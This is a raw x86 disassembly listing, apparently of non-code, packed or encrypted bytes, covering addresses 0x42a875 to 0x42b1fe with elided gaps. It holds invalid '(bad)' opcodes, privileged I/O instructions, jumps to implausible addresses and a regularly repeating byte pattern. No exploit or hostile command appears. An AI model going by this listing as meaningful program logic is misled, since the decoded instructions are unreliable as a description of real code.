  42a875:	test   ch,dl
  42a877:	loop   0x42a8cd
  42a879:	fild   QWORD PTR [edx+0x3f]
  42a87c:	adc    bh,cl
  42a87e:	mov    ch,0x0
  42a880:	push   0x27eea65e
  42a885:	adc    al,0x62
  42a887:	out    0x35,al
  42a889:	lods   eax,DWORD PTR ds:[esi]
  42a88a:	shl    BYTE PTR [eax+0xcf8fdc5],cl
  42a890:	inc    edx
  42a891:	mov    al,0xb5
  42a893:	sbb    bh,dh
  42a895:	arpl   WORD PTR [edx+edx*2+0x38abcf88],bx
  42a89c:	les    ebp,FWORD PTR [ebx]
  42a89e:	int    0xb
  42a8a0:	or     eax,0x1dd17c7d
  42a8a5:	inc    esp
  42a8a6:	dec    ebx
  42a8a7:	aad    0x31
  42a8a9:	out    0x50,eax
  42a8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8ac:	int3   
  42a8ad:	sub    eax,0x7d92b8fe
  42a8b2:	ror    BYTE PTR [bx-0x57],cl
  42a8b6:	test   DWORD PTR [ecx+eax*4],ecx
  42a8b9:	sub    eax,0x785b1cf7
  42a8be:	cmc    
  42a8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8c0:	sub    BYTE PTR [eax-0x6],0x6c
  42a8c4:	sub    DWORD PTR [ecx+0x5828e5bb],0xffffffd7
  42a8cb:	mov    es,WORD PTR [ecx-0x29588afa]
  42a8d1:	iret   
  42a8d2:	xor    ebp,0xffffffe5
  42a8d5:	ffree  st(0)
  42a8d7:	sahf   
  42a8d8:	push   esp
  42a8d9:	idiv   DWORD PTR [ebx-0x2060b1a4]
  42a8df:	sub    al,0xc9
  42a8e1:	fs mov ebx,0x5517ea2b
  42a8e7:	imul   ecx,DWORD PTR [eax-0x58ed8d74],0xd3d99be5
  42a8f1:	in     al,dx
  42a8f2:	outs   dx,DWORD PTR ds:[esi]
  42a8f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8f4:	lock out 0xb9,eax
  42a8f7:	mov    eax,0xa1493e47
  42a8fc:	mov    al,ds:0xaa45a169
  42a901:	nop
  42a902:	mov    ch,BYTE PTR ds:0x6705ca75
  42a908:	sub    edi,DWORD PTR [eax-0x100d510a]
  42a90e:	stos   BYTE PTR es:[edi],al
  42a90f:	inc    esi
  42a910:	iret   
  42a911:	mov    esi,0x4868dc0f
  42a916:	adc    ebx,edi
  42a918:	push   0x5e
  42a91a:	aad    0xf7
  42a91c:	pop    eax
  42a91d:	rcl    BYTE PTR [ebp-0x73fc5d96],1
  42a923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a924:	jmp    0xfdf90c42
  42a929:	js     0x42a8c2
  42a92b:	pop    es
  42a92c:	das    
  42a92d:	jno    0x42a8d7
  42a92f:	cld    
  42a930:	push   cs
  42a931:	sub    ecx,DWORD PTR [esi]
  42a933:	sbb    DWORD PTR [ebx+0x0],0x0
	...
  42a996:	test   al,0x93
  42a998:	sbb    eax,0xfbee3fee
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     edx,esi
  42a9a3:	inc    esi
  42a9a4:	pop    esi
  42a9a5:	cld    
  42a9a6:	mov    eax,edi
  42a9a8:	add    DWORD PTR [eax],eax
  42a9aa:	pop    es
  42a9ab:	add    DWORD PTR [eax],eax
  42a9ad:	add    BYTE PTR ds:0x979ab9e2,al
  42a9b3:	xor    dl,BYTE PTR [ecx]
  42a9b5:	or     esi,ecx
  42a9b7:	fst    st(1)
  42a9b9:	fwait
  42a9ba:	mov    dl,0x81
  42a9bc:	mov    dh,0xbe
  42a9be:	sti    
  42a9bf:	idiv   DWORD PTR [edx-0x20e29d7e]
  42a9c5:	rcr    dl,0x8e
  42a9c8:	data16 fst QWORD PTR ds:0x1f1d58d7
  42a9cf:	mov    dl,0x0
  42a9d1:	sub    bl,dh
  42a9d3:	in     al,0x39
  42a9d5:	pop    ss
  42a9d6:	dec    ecx
  42a9d7:	(bad)  
  42a9d8:	dec    esp
  42a9d9:	mov    ebp,0xf480e1a3
  42a9de:	stos   DWORD PTR es:[edi],eax
  42a9df:	mov    DWORD PTR [edi-0x3f106834],eax
  42a9e5:	sub    ah,ch
  42a9e7:	cdq    
  42a9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9e9:	dec    ecx
  42a9ea:	call   0x8ca7224b
  42a9ef:	dec    eax
  42a9f0:	inc    ecx
  42a9f1:	cmc    
  42a9f2:	sbb    esp,DWORD PTR [edx]
  42a9f4:	fst    DWORD PTR [esi+0x6d]
  42a9f7:	fimul  WORD PTR [esi-0x74bab0e2]
  42a9fd:	ins    DWORD PTR es:[edi],dx
  42a9fe:	(bad)  [esi]
  42aa00:	adc    dl,BYTE PTR [eax+0x56ef634b]
  42aa06:	adc    DWORD PTR [edx+0x6c],edi
  42aa09:	xchg   ebp,eax
  42aa0a:	addr16 es inc edi
  42aa0d:	inc    esi
  42aa0e:	jnp    0x42a9ff
  42aa10:	ficomp WORD PTR [eax+0x6e]
  42aa13:	pop    ecx
  42aa14:	push   edi
  42aa15:	jbe    0x42a99b
  42aa17:	jmp    0xdfc6:0x4d2495b0
  42aa1e:	cld    
  42aa1f:	retf   0x8dc1
  42aa22:	xchg   esp,eax
  42aa23:	ds leave 
  42aa25:	dec    esi
  42aa26:	xor    DWORD PTR [edi+eiz*4-0x36fe82f4],esp
  42aa2d:	xchg   ecx,eax
  42aa2e:	pop    es
  42aa2f:	fimul  WORD PTR [edi+eax*4+0x1bdc0631]
  42aa36:	mov    WORD PTR [edx],ss
  42aa38:	ror    dh,cl
  42aa3a:	jp     0x42a9cd
  42aa3c:	retf   0xe80d
  42aa3f:	pushf  
  42aa40:	jnp    0x42aa66
  42aa42:	out    0xe6,al
  42aa44:	call   0x22077fc8
  42aa49:	push   ss
  42aa4a:	sbb    eax,0xe16ec00a
  42aa4f:	sub    BYTE PTR [ecx],cl
  42aa51:	loop   0x42aa0c
  42aa53:	mov    al,ds:0x18fb8d22
  42aa58:	rol    BYTE PTR [esp+ebp*4-0x55],cl
  42aa5c:	pop    edx
  42aa5d:	cwde   
  42aa5e:	fisttp DWORD PTR [ebp+0x2c44b84c]
  42aa64:	jle    0x42aa0b
  42aa66:	in     eax,dx
  42aa67:	iret   
  42aa68:	js     0x42aad3
  42aa6a:	jmp    0x5b9d1d30
  42aa6f:	mov    ecx,0xe3630604
  42aa74:	jbe    0x42aaf2
  42aa76:	arpl   WORD PTR ds:0x5cf4ec42,cx
  42aa7c:	pop    esp
  42aa7d:	repnz (bad) 
  42aa7f:	mov    edi,0x5767ca85
  42aa84:	inc    esi
  42aa85:	xor    al,0x4a
  42aa87:	imul   BYTE PTR [ebp+0x35]
  42aa8a:	xor    DWORD PTR [eax+0x63],esp
  42aa8d:	jp     0x42aa1a
  42aa8f:	loope  0x42aa43
  42aa91:	out    dx,eax
  42aa92:	mov    al,0x91
  42aa94:	pushf  
  42aa95:	jp     0x42aa29
  42aa97:	jbe    0x42aa52
  42aa99:	lods   al,BYTE PTR ds:[esi]
  42aa9a:	shl    DWORD PTR [ebx-0x11581ea8],1
  42aaa0:	adc    ecx,eax
  42aaa2:	popf   
  42aaa3:	test   esp,ebp
  42aaa5:	fmul   st,st(5)
  42aaa7:	xor    al,0xbf
  42aaa9:	fisttp QWORD PTR [ebx+0x49]
  42aaac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaad:	sub    edx,DWORD PTR [eax+0x5719d652]
  42aab3:	and    bl,al
	...
  42ab15:	add    BYTE PTR [esi],bh
  42ab17:	push   cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [edx+ebp*8-0x376d972f],esp
  42ab28:	add    DWORD PTR [eax],eax
  42ab2a:	pop    es
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [esi+0x10],dl
  42ab30:	push   0x800420f6
  42ab35:	inc    ebp
  42ab36:	dec    ebx
  42ab37:	pop    ebp
  42ab38:	rcr    DWORD PTR [ebp-0x1a51208f],1
  42ab3e:	inc    edx
  42ab3f:	mov    ch,0x98
  42ab41:	fmul   DWORD PTR [ecx]
  42ab43:	pop    esi
  42ab44:	sub    al,0xbe
  42ab46:	pop    eax
  42ab47:	inc    ebx
  42ab48:	fs icebp 
  42ab4a:	scas   eax,DWORD PTR es:[edi]
  42ab4b:	loopne 0x42ab96
  42ab4d:	cmp    DWORD PTR [eax],ebx
  42ab4f:	mov    esp,0xf21cc3b2
  42ab54:	adc    esp,DWORD PTR [edi+ecx*2-0x6c]
  42ab58:	out    0x4a,eax
  42ab5a:	add    al,BYTE PTR [eax-0x18]
  42ab5d:	popa   
  42ab5e:	adc    dl,BYTE PTR [ebp+edx*2-0x4d8d8004]
  42ab65:	jne    0x42ab29
  42ab67:	ins    DWORD PTR es:[edi],dx
  42ab68:	cmp    al,0xab
  42ab6a:	cmp    DWORD PTR [edx+0x30],esp
  42ab6d:	cmp    al,0x9f
  42ab6f:	popa   
  42ab70:	sti    
  42ab71:	test   al,0x79
  42ab73:	pop    ss
  42ab74:	xchg   esi,eax
  42ab75:	pop    ecx
  42ab76:	jbe    0x42ab49
  42ab78:	sub    DWORD PTR [eax+edx*1],ecx
  42ab7b:	leave  
  42ab7c:	(bad)  
  42ab7d:	cmp    ebx,ecx
  42ab7f:	sbb    edi,DWORD PTR [edx]
  42ab81:	cli    
  42ab82:	enter  0x8fae,0xbb
  42ab86:	sar    BYTE PTR [ebx-0x22],cl
  42ab89:	fsubr  QWORD PTR [esi+0x45f07552]
  42ab8f:	xor    esi,DWORD PTR [edi-0x7669efd5]
  42ab95:	add    eax,0x92dd67e0
  42ab9a:	(bad)  
  42ab9b:	int3   
  42ab9c:	sbb    DWORD PTR [ebx-0x78],edi
  42ab9f:	out    dx,al
  42aba0:	addr16 dec esp
  42aba2:	hlt    
  42aba3:	lea    ecx,[ebp+0x75a54ebf]
  42aba9:	or     edx,DWORD PTR [ebx+0x10]
  42abac:	sub    DWORD PTR [edx+0x15],eax
  42abaf:	mov    ebx,0x64ee3b94
  42abb4:	xchg   BYTE PTR [ecx+0x3751bb8c],cl
  42abba:	(bad)  
  42abbb:	jae    0x42ab45
  42abbd:	cmp    ch,BYTE PTR [ecx+0x38]
  42abc0:	pop    edi
  42abc1:	iret   
  42abc2:	sub    dh,bh
  42abc4:	cmp    esi,DWORD PTR [edx+0xd]
  42abc7:	std    
  42abc8:	dec    ecx
  42abc9:	ins    BYTE PTR es:[edi],dx
  42abca:	sub    al,0x86
  42abcc:	loopne 0x42ab58
  42abce:	lock xlat BYTE PTR ds:[ebx]
  42abd0:	ins    BYTE PTR es:[edi],dx
  42abd1:	mov    ebx,0xdc299bab
  42abd6:	call   0x179a749a
  42abdb:	setp   BYTE PTR [edx]
  42abde:	xchg   BYTE PTR ds:0x6e2f1247,al
  42abe4:	adc    BYTE PTR [esi-0x4],dh
  42abe7:	inc    ebx
  42abe8:	push   ebp
  42abe9:	sbb    bh,dh
  42abeb:	repz rol DWORD PTR [esi+eax*4],1
  42abef:	jmp    0x724327ba
  42abf4:	cmp    ebp,DWORD PTR ds:0x1a179262
  42abfa:	aas    
  42abfb:	fdivr  DWORD PTR [ebx-0x7d]
  42abfe:	adc    al,0x3c
  42ac00:	(bad)
  42ac03:	(bad)  
  42ac04:	in     al,dx
  42ac05:	loopne 0x42ab90
  42ac07:	mov    dl,0x66
  42ac09:	imul   ecx,ebp,0x5f
  42ac0c:	out    0x87,al
  42ac0e:	aad    0xab
  42ac10:	xchg   BYTE PTR [edi],al
  42ac12:	mov    WORD PTR [ebx+0x14],?
  42ac15:	fisttp DWORD PTR [ebx+0x553969d3]
  42ac1b:	cmp    BYTE PTR [edx],bl
  42ac1d:	in     al,dx
  42ac1e:	data16 or BYTE PTR [edi-0x6f5ed45a],bl
  42ac25:	inc    ebx
  42ac26:	out    dx,al
  42ac27:	out    0x9c,al
  42ac29:	jmp    0x3850d464
  42ac2e:	pushf  
  42ac2f:	scas   eax,DWORD PTR es:[edi]
  42ac30:	jb     0x42ac41
  42ac32:	iret   
  42ac33:	in     eax,0x56
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x3ca8f5a7],cl
  42aca4:	fmul   QWORD PTR [ecx-0x67]
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    cl,ch
  42acaf:	xor    DWORD PTR [eax],ebx
  42acb1:	dec    edx
  42acb2:	or     dl,bh
  42acb4:	stos   BYTE PTR es:[edi],al
  42acb5:	add    esp,DWORD PTR [esi+0x45cd3e38]
  42acbb:	cmp    BYTE PTR [ebp+0x28],al
  42acbe:	int3   
  42acbf:	pushf  
  42acc0:	push   cs
  42acc1:	pushf  
  42acc2:	pop    ebp
  42acc3:	inc    edi
  42acc4:	mov    DWORD PTR [ecx-0x5c53d44d],0xe10f846f
  42acce:	in     eax,0x71
  42acd0:	inc    esi
  42acd1:	push   edi
  42acd2:	jae    0x42ac79
  42acd4:	fnstsw WORD PTR [edx]
  42acd6:	jo     0x42ad55
  42acd8:	shl    DWORD PTR [ecx-0x12],1
  42acdb:	xchg   esp,eax
  42acdc:	loope  0x42ac78
  42acde:	xlat   BYTE PTR ds:[ebx]
  42acdf:	shr    BYTE PTR [edx-0x5],cl
  42ace2:	mov    ebx,0x3facdfad
  42ace7:	in     al,0x29
  42ace9:	fld    TBYTE PTR [eax+ecx*4]
  42acec:	adc    eax,esp
  42acee:	mov    ?,WORD PTR [ecx-0x63ba0044]
  42acf4:	imul   eax,DWORD PTR [eax-0x4434ed06],0xd33203b
  42acfe:	bound  esp,QWORD PTR [edi+0x7]
  42ad01:	add    ebp,DWORD PTR [edi-0x396a503f]
  42ad07:	xchg   esp,eax
  42ad08:	push   esp
  42ad09:	sub    eax,0xe94495a4
  42ad0e:	idiv   BYTE PTR [edi+0x73fa886b]
  42ad14:	pop    es
  42ad15:	cli    
  42ad16:	div    dh
  42ad18:	popf   
  42ad19:	ins    DWORD PTR es:[edi],dx
  42ad1a:	fiadd  DWORD PTR [ebp-0x7fca8ca4]
  42ad20:	ret    
  42ad21:	fmul   QWORD PTR [esp+ecx*1+0x78ae0454]
  42ad28:	mov    BYTE PTR [edx],ah
  42ad2a:	mov    ds:0x1fd079bb,eax
  42ad2f:	mov    eax,ss:0x206a5d92
  42ad35:	push   0x89206684
  42ad3a:	loopne 0x42ace0
  42ad3c:	cli    
  42ad3d:	jb     0x42ad4f
  42ad3f:	xor    BYTE PTR [edi-0x5c],bl
  42ad42:	aam    0x39
  42ad44:	mov    edx,0xe8f24c30
  42ad49:	fild   WORD PTR [edx+edi*4]
  42ad4c:	jmp    0xe369:0x269f3b2a
  42ad53:	pop    ebp
  42ad54:	aas    
  42ad55:	shr    DWORD PTR [ecx-0x7f],1
  42ad58:	in     eax,0x3a
  42ad5a:	ins    BYTE PTR es:[edi],dx
  42ad5b:	jle    0x42adad
  42ad5d:	mov    dh,0xa
  42ad5f:	push   edi
  42ad60:	retf   
  42ad61:	jp     0x42ad0f
  42ad63:	push   edi
  42ad64:	mov    esi,0x8cc5b97c
  42ad69:	imul   edx,DWORD PTR [edx-0x73],0x2b
  42ad6d:	adc    BYTE PTR [esi-0x40d9068b],dl
  42ad73:	pop    eax
  42ad74:	dec    esi
  42ad75:	jmp    0x42ad9c
  42ad77:	push   esp
  42ad78:	cmp    al,BYTE PTR [esi]
  42ad7a:	push   ecx
  42ad7b:	xor    DWORD PTR [ebp-0x34],ecx
  42ad7e:	xchg   edx,eax
  42ad7f:	mov    ebp,0x850fb568
  42ad84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad85:	call   0xc5c22b93
  42ad8a:	ins    BYTE PTR es:[edi],dx
  42ad8b:	fnstsw WORD PTR [edi-0x1c]
  42ad8e:	addr16 inc edi
  42ad90:	mov    eax,0xe7f5d088
  42ad95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad96:	mov    ch,0x96
  42ad98:	pop    ss
  42ad99:	cs (bad) 
  42ad9b:	jmp    0x42ad97
  42ad9d:	push   ds
  42ad9e:	mov    dl,cl
  42ada0:	leave  
  42ada1:	lds    ecx,FWORD PTR [eax-0x298b3f0d]
  42ada7:	ret    0xb85d
  42adaa:	outs   dx,BYTE PTR ds:[esi]
  42adab:	ins    BYTE PTR es:[edi],dx
  42adac:	mov    ebp,0x7e848c39
  42adb1:	ret    
  42adb2:	jno    0x42ad44
  42adb4:	xchg   esp,eax
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [edx+ebp*2-0x5f8c8c2a]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    BYTE PTR [ecx+0xaeda20c],ch
  42ae33:	jg     0x42ae5e
  42ae35:	pop    esp
  42ae36:	cmp    eax,DWORD PTR [esi-0x15]
  42ae39:	or     al,0x60
  42ae3b:	and    DWORD PTR [eax],eax
  42ae3d:	jge    0x42ae3c
  42ae3f:	jne    0x42ae81
  42ae41:	mov    ds:0x8565860f,al
  42ae46:	add    eax,0x7e105fa1
  42ae4b:	push   eax
  42ae4c:	lahf   
  42ae4d:	(bad)  
  42ae4e:	cmp    DWORD PTR [esi+0xa],eax
  42ae51:	sbb    al,BYTE PTR [eax+ecx*8+0x34961fe1]
  42ae58:	mov    eax,0xeff48d01
  42ae5d:	repnz jecxz 0x42ae07
  42ae60:	sbb    ch,al
  42ae62:	push   esi
  42ae63:	or     dl,BYTE PTR [ebx]
  42ae65:	mov    bh,0x6a
  42ae67:	fscale 
  42ae69:	mov    dl,0x78
  42ae6b:	(bad)  
  42ae6c:	cmp    bl,BYTE PTR [esp+edi*2]
  42ae6f:	pop    ebx
  42ae70:	sub    esi,DWORD PTR [ebp+0x3a]
  42ae73:	lock ret 0xd880
  42ae77:	add    al,0x38
  42ae79:	iret   
  42ae7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae7b:	xchg   ecx,eax
  42ae7c:	mov    edi,0x454d4327
  42ae81:	add    dl,0x33
  42ae84:	ss pop esp
  42ae86:	add    BYTE PTR [esi+ebx*8-0x3337b151],dl
  42ae8d:	jmp    FWORD PTR [edx+0x43]
  42ae90:	pop    edx
  42ae91:	cmp    eax,0x2d9cbd3d
  42ae96:	ret    0xd7f1
  42ae99:	adc    ch,dh
  42ae9b:	sbb    DWORD PTR ds:0x18bd82f,esp
  42aea1:	push   ecx
  42aea2:	pop    esp
  42aea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aea4:	(bad)  
  42aea5:	xchg   ebx,eax
  42aea6:	sub    BYTE PTR ds:0x8c9ab260,bh
  42aeac:	sub    DWORD PTR [ecx+0x6efa73e0],0x23611fdb
  42aeb6:	add    BYTE PTR [ebx-0x62],cl
  42aeb9:	dec    edx
  42aeba:	repz dec eax
  42aebc:	mov    ah,0x99
  42aebe:	sar    DWORD PTR [esi+0x3],0x54
  42aec2:	fidivr DWORD PTR [eax+esi*8-0x10c95f0c]
  42aec9:	xchg   ecx,eax
  42aeca:	pushf  
  42aecb:	jmp    0x42af37
  42aecd:	daa    
  42aece:	ss int3 
  42aed0:	xor    esp,DWORD PTR [edi]
  42aed2:	add    eax,DWORD PTR [edx+ecx*2+0x60]
  42aed6:	push   edi
  42aed7:	sbb    al,0x27
  42aed9:	and    BYTE PTR [edx+0x3ca1a786],bl
  42aedf:	gs jle 0x42af5d
  42aee2:	test   esi,ebx
  42aee4:	(bad)  
  42aee5:	mov    ecx,0x84097f8e
  42aeea:	inc    ecx
  42aeeb:	bound  edi,QWORD PTR [ebp-0x1e75801f]
  42aef1:	pop    ebp
  42aef2:	test   BYTE PTR [eax+0x63d1d74a],bl
  42aef8:	adc    DWORD PTR [ebp-0x4fbb1d61],0x56
  42aeff:	sbb    eax,0xfda6ac3f
  42af04:	cs dec ebp
  42af06:	dec    edx
  42af07:	sub    al,0xd8
  42af09:	les    edi,FWORD PTR [ebp+0x1335671d]
  42af0f:	jecxz  0x42aefc
  42af11:	fwait
  42af12:	push   esi
  42af13:	js     0x42aef8
  42af15:	and    ebp,DWORD PTR [ecx+0x289bf84a]
  42af1b:	fild   DWORD PTR [ebx]
  42af1d:	xor    eax,0xb49a3680
  42af22:	out    0x44,eax
  42af24:	or     al,0x87
  42af26:	retf   
  42af27:	sub    dh,BYTE PTR [ecx]
  42af29:	jmp    0x21e8:0x64e6fd76
  42af30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af31:	jb     0x42aeff
  42af33:	popa   
  42af34:	jnp    0x42af36
	...
  42af96:	stc    
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp-0x4af4d316],0xffffff8c
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [edx-0xe],dl
  42afb0:	adc    bh,BYTE PTR [eax+0x69]
  42afb3:	mov    ch,0x50
  42afb5:	out    0x89,eax
  42afb7:	lods   al,BYTE PTR ds:[esi]
  42afb8:	ret    
  42afb9:	(bad)
  42afbe:	dec    edi
  42afbf:	mov    esp,0xeb616ead
  42afc4:	and    DWORD PTR [edx+edi*2],eax
  42afc7:	dec    edi
  42afc8:	pop    edi
  42afc9:	mov    esi,0x5c965335
  42afce:	lods   eax,DWORD PTR ds:[esi]
  42afcf:	xor    DWORD PTR [ebx],0x23dfe1d9
  42afd5:	mov    ch,0x13
  42afd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afd8:	bound  edx,QWORD PTR [ebx-0x10cf01e8]
  42afde:	cmc    
  42afdf:	add    ah,BYTE PTR [ecx]
  42afe1:	xchg   edi,eax
  42afe2:	in     eax,0x8
  42afe4:	or     DWORD PTR [ebx],0x54db3f84
  42afea:	pop    ds
  42afeb:	mov    al,0xfc
  42afed:	ds test eax,0x33da2644
  42aff3:	test   al,0x65
  42aff5:	popf   
  42aff6:	or     esp,DWORD PTR [esi+0x3e]
  42aff9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42affb:	daa    
  42affc:	cmp    al,0xc4
  42affe:	jl     0x42b058
  42b000:	fucom  st(3)
  42b002:	je     0x42b02c
  42b004:	add    BYTE PTR [ecx],bh
  42b006:	xchg   edx,eax
  42b007:	aaa    
  42b008:	outs   dx,BYTE PTR ds:[esi]
  42b009:	push   edx
  42b00a:	cmp    edi,DWORD PTR [ebx]
  42b00c:	outs   dx,BYTE PTR ds:[esi]
  42b00d:	(bad)  [ebx]
  42b00f:	pop    esi
  42b010:	xchg   DWORD PTR [edi+0x2fa1cf0d],esp
  42b016:	add    eax,0xf085fcfc
  42b01b:	fcmovnbe st,st(0)
  42b01d:	les    ebx,FWORD PTR [ecx+0x7ca00e78]
  42b023:	retf   0x1177
  42b026:	mov    al,ds:0xdd90691c
  42b02b:	(bad)  
  42b02c:	outs   dx,BYTE PTR ds:[esi]
  42b02d:	cs stos DWORD PTR es:[edi],eax
  42b02f:	xchg   ebx,eax
  42b030:	pop    eax
  42b031:	mov    ds:0x7077eaff,al
  42b036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b037:	icebp  
  42b038:	inc    edx
  42b039:	nop
  42b03a:	xor    BYTE PTR [ebx+0x64b882eb],cl
  42b040:	sbb    DWORD PTR [edi+0x7d],edx
  42b043:	add    eax,0xbef1f2a8
  42b048:	xchg   ebp,eax
  42b049:	arpl   WORD PTR ds:0x6e95efd9,bp
  42b04f:	ins    BYTE PTR es:[edi],dx
  42b050:	les    eax,FWORD PTR [eax+0x17c5b7e5]
  42b056:	pop    ds
  42b057:	je     0x42b0af
  42b059:	out    0xe3,al
  42b05b:	rcl    DWORD PTR [ecx-0x67],1
  42b05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05f:	xor    al,0xd1
  42b061:	dec    edi
  42b062:	out    0xbb,eax
  42b064:	lock leave 
  42b066:	pop    ds
  42b067:	call   0xc0b3:0x2477dc10
  42b06e:	jl     0x42b090
  42b070:	push   edx
  42b071:	inc    ebx
  42b072:	mov    ds:0x5e5cba46,eax
  42b077:	sub    BYTE PTR [esi+edi*2],bh
  42b07a:	rcr    dh,cl
  42b07c:	pop    edi
  42b07d:	ja     0x42b0d7
  42b07f:	(bad)  
  42b080:	in     eax,dx
  42b081:	or     eax,0x5e45832a
  42b086:	nop
  42b087:	jl     0x42b02b
  42b089:	cwde   
  42b08a:	and    eax,0xb33ad64d
  42b08f:	ins    DWORD PTR es:[edi],dx
  42b090:	xor    dl,BYTE PTR [eax-0x237b55c1]
  42b096:	daa    
  42b097:	ficomp WORD PTR [edi-0x3b]
  42b09a:	mov    al,0x1a
  42b09c:	pop    esp
  42b09d:	enter  0xf2fa,0xcc
  42b0a1:	jnp    0x42b0c8
  42b0a3:	dec    ebx
  42b0a4:	nop
  42b0a5:	mov    eax,0x5a7a1ad8
  42b0aa:	iret   
  42b0ab:	cwde   
  42b0ac:	loopne 0x42b085
  42b0ae:	mov    gs,eax
  42b0b0:	or     al,0x5c
  42b0b2:	cmp    eax,0x731a
	...
  42b113:	add    BYTE PTR [eax],al
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x350080ad]
  42b124:	das    
  42b125:	stos   DWORD PTR es:[edi],eax
  42b126:	scas   al,BYTE PTR es:[edi]
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [ebx-0x25],ah
  42b130:	pop    es
  42b131:	pop    ebx
  42b132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b134:	cs in  al,0x65
  42b137:	adc    edi,edi
  42b139:	ret    
  42b13a:	add    DWORD PTR [edx+esi*4+0x5c3bccf1],0xffffffb2
  42b142:	shl    BYTE PTR [edi+0x5eb16c5c],0xe2
  42b149:	cmp    al,0x18
  42b14b:	and    edx,ebx
  42b14d:	loope  0x42b0fa
  42b14f:	pop    esp
  42b150:	mov    ds:0xdb94469d,eax
  42b155:	icebp  
  42b156:	mov    ds:0x5fb77237,eax
  42b15b:	push   esi
  42b15c:	inc    edi
  42b15d:	push   cs
  42b15e:	cmp    edx,DWORD PTR [ecx+0x5e605499]
  42b164:	sub    BYTE PTR [edi+eax*2-0x585565e7],al
  42b16b:	adc    cl,BYTE PTR [edi+0x79024de]
  42b171:	xchg   esi,eax
  42b172:	imul   ecx,edx,0xffffffd4
  42b175:	ret    
  42b176:	and    al,0x83
  42b178:	xor    edi,DWORD PTR [edx]
  42b17a:	nop
  42b17b:	mov    ch,0xdb
  42b17d:	outs   dx,BYTE PTR ds:[esi]
  42b17e:	test   BYTE PTR [ebx],ch
  42b180:	add    al,0x46
  42b182:	repz daa 
  42b184:	cmp    ch,bh
  42b186:	cli    
  42b187:	mov    ds:0x1f5eb18f,eax
  42b18c:	sub    bl,dh
  42b18e:	adc    cl,BYTE PTR [edx+eiz*4]
  42b191:	bound  ebp,QWORD PTR ss:[ebx]
  42b194:	stc    
  42b195:	cld    
  42b196:	repnz mov ah,dl
  42b199:	dec    edi
  42b19a:	fwait
  42b19b:	retf   
  42b19c:	jmp    0x42b185
  42b19e:	loopne 0x42b200
  42b1a0:	call   0xc54a4855
  42b1a5:	xchg   esi,eax
  42b1a6:	xchg   edx,eax
  42b1a7:	push   ebx
  42b1a8:	pop    esi
  42b1a9:	xchg   ecx,eax
  42b1aa:	mov    eax,DWORD PTR [esi+esi*4]
  42b1ad:	cdq    
  42b1ae:	and    BYTE PTR [edi-0x3ed11e89],ah
  42b1b4:	adc    al,BYTE PTR [edx+0x11f2df92]
  42b1ba:	jo     0x42b1a6
  42b1bc:	mov    eax,ds:0xeb02e100
  42b1c1:	jns    0x42b149
  42b1c3:	inc    eax
  42b1c4:	cmp    DWORD PTR [esi+0x3249d9c5],0xbef29a17
  42b1ce:	int3   
  42b1cf:	add    eax,0xcf3baf33
  42b1d4:	(bad)  [ebp-0x3c]
  42b1d7:	add    dh,BYTE PTR [ebx]
  42b1d9:	mov    cl,dh
  42b1db:	pusha  
  42b1dc:	push   0xffffffbb
  42b1de:	jg     0x42b1eb
  42b1e0:	xchg   DWORD PTR es:[edi-0xb],edi
  42b1e4:	scas   al,BYTE PTR es:[edi]
  42b1e5:	pop    ebp
  42b1e6:	ret    0x280d
  42b1e9:	rcr    dh,1
  42b1eb:	push   eax
  42b1ec:	xchg   DWORD PTR fs:[ebx+0x6c],ebp
  42b1f0:	call   0x59a6:0xdcef
  42b1f6:	hlt    
  42b1f7:	fs mov ebx,0x32abddf2
  42b1fd:	push   ebp
  42b1fe:	pop    ecx
